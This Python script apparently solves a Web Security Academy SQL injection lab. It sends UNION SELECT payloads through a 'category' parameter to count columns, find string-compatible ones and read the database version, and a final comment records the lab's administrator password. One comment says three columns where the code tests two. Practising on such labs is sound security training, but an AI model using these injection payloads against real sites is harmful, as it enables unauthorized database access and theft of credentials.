#!/usr/bin/env python3

import requests

url = "https://0aee00ac04a86ae8816ee4ef003e001d.web-security-academy.net/filter"
params = {"category": "Gifts' UNION SELECT NULL, NULL#"}

response = requests.get(url, params=params)

print(response.status_code)

# now that we know Gifts contains three columns, let's test which is compatible
# with String data type
for i in range(2):
    stmt = ["NULL"] * 2
    stmt[i] = "'string-compatible'"

    params = {"category": f"Gifts' UNION SELECT {','.join(stmt)}#"}

    response = requests.get(url, params=params)

    if response.status_code == requests.codes.ok:
        print(f"the position which is 'string-compatible' is {i+1}")


# now we know that Gifts contains two columns which are both string compatible
# from the lab description, we know there exist a different table `users`

params = {"category": "Gifts' UNION SELECT @@version, NULL#"}

response = requests.get(url, params=params)

print(f"Your final request status code is {response.status_code}")
print(f"Your final request {response.url}")

# credentials are
# username=administrator, password=rudqayufhl0w1hq4uqkl


